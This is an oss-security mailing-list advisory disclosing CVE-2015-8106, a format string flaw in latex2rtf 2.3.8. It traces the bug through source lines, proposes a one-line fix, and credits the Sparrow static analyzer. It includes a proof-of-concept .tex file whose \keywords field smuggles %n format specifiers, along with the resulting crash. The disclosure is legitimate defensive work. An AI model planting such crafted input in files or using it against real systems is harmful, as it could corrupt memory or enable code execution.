X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3768" "Monday" "16" "November" "2015" "19:18:10" "+0900" "=?UTF-8?B?6rmA7KKF6raM?=" "jgkim@ropas.snu.ac.kr" "<5649AD62.8040704@ropas.snu.ac.kr>" "119" "[oss-security] CVE-2015-8106 - latex2rtf v2.3.8 format string vulnerability" "^Cc:" nil nil "11" "2015111610:18:10" "[oss-security] CVE-2015-8106 - latex2rtf v2.3.8 format string vulnerability" (number mark "U       jgkim@ropas. Nov 16  119/3768  " thread-indent "\"[oss-security] CVE-2015-8106 - latex2rtf v2.3.8 format string vulnerability\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 28368 invoked by uid 550); 16 Nov 2015 12:57:47 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 12249 invoked from network); 16 Nov 2015 10:18:08 -0000
Message-ID: <5649AD62.8040704@ropas.snu.ac.kr>
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:38.0) Gecko/20100101
 Thunderbird/38.3.0
MIME-Version: 1.0
Content-Type: multipart/alternative;
 boundary="------------090907090906070207040606"
Cc: wslee@ropas.snu.ac.kr
Date: Mon, 16 Nov 2015 19:18:10 +0900
From: =?UTF-8?B?6rmA7KKF6raM?= <jgkim@ropas.snu.ac.kr>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] CVE-2015-8106 - latex2rtf v2.3.8 format string vulnerability
To: oss-security@lists.openwall.com

--------------090907090906070207040606
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 8bit

Dear List,

I am writing this to report a format string vulnerability in ubuntu 
package latex2rtf. (2.3.8, which is the latest version).
Also I already have been assigned a CVE identifier from MITRE 
"CVE-2015-8106", so I want to make public this vulnerability.


- Target Platform
    Windows, Linux, OS X
- Target Version
    2.3.8 (Latest Version)

- Vulnerability description
When the user runs latex2rtf with malicious crafted tex file, an 
attacker can execute arbitrary code.
The function CmdKeywords processes the \keywords command in tex file.
The variable `keywords' in the function CmdKeywords may hold a malicious 
input string, which can be used as a format argument of vsnprintf.

-- Step 1. (funct1.c 1789 line)

1789        char *keywords = getBraceParam();

For instance, the variable keywords will point to the string “MALICIOUS” 
when a text line "\keywords{MALICIOUS}” exists in an input tex file.

-- Step 2. (funct1.c 1798 line)

1798    fprintRTF(keywords);

fprintfRTF() is called in line 1798, and the parameter is used as a 
format string, which can be malicious, as we described in step 1.

-- Step 3. (main.c 873 line)
858    void fprintRTF(char *format, ...){
       ...
873    vsnprintf(buffer, 1024, format, apf);
       ...

The value of format, which may be malicious, is used as an argument of 
vsnprintf in line 873, therefore arbitrary code can be executed.

-- Step 4. Our malicious input
"exploit.tex"
========================
\documentclass{article}
\begin{document}
\title{Exploitable}
\author{Jong-Gwon Kim}
\keywords{%x\%n\%n\%n}
\end{document}
=========================
Execute
==========================
~ $ latex2rtf -v
latex2rtf 2.3.8 r1240 (released June 16 2014)

Copyright (C) 2012 Free Software Foundation, Inc.
This is free software; see the source for copying conditions. There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

Written by Prahl, Lehner, Granzer, Dorner, Polzer, Trisko, Schlatterbeck.
~ $ latex2rtf exploit.tex
aborted (core dumped)
==========================

-- Step 5. How to fix
(funct1.c 1798 line)

1798    fprintRTF(keywords);  ===>  fprintRTF("%s", keywords);


- How we found the vulnerability

We used a static analyzer, Sparrow[1], to find the format string bug. 
Our analyzer reported an alarm in latex2rtf main.c 873 line, So we 
looked for a latex2rtf source code and found the bug.

Sparrow is a state-of-the-art static analyzer that aims to verify the 
absence of fatal bugs in C source. Sparrow is designed by Abstract 
Interpretation and the analysis is sound in design. Sparrow adopts a 
number of well-founded static analysis techniques[2,3] for scalability, 
precision, and user convenience.

References
[1]: http://ropas.snu.ac.kr/sparrow/
[2]: Selective Context-Sensitivity Guided by Impact Pre-Analysis. Hakjoo 
Oh, Wonchan Lee, Kihong Heo, Hongseok Yang, and Kwangkeun Yi. PLDI'14.
[3]: Design and Implementation of Sparse Global Analyses for C-like 
Languages. Hakjoo Oh, Kihong Heo, Wonchan Lee, Woosuk Lee, and Kwangkeun 
Yi. PLDI'12

Sincerely, Jong-Gwon Kim & Woosuk Lee

-----------------------------
Jong-Gwon Kim
Graduate student
ROPAS lab. (http://ropas.snu.ac.kr/)
ROSAEC center (http://rosaec.snu.ac.kr/)
Seoul National University
(tel) +82-2-880-1865
(email) jgkim@ropas.snu.ac.kr
-----------------------------
-----------------------------
Woosuk Lee
Ph.D. candidate
ROPAS lab. (http://ropas.snu.ac.kr/)
ROSAEC center (http://rosaec.snu.ac.kr/)
Seoul National University
(tel) +82-2-880-1865
(email) wslee@ropas.snu.ac.kr
-----------------------------

--------------090907090906070207040606--
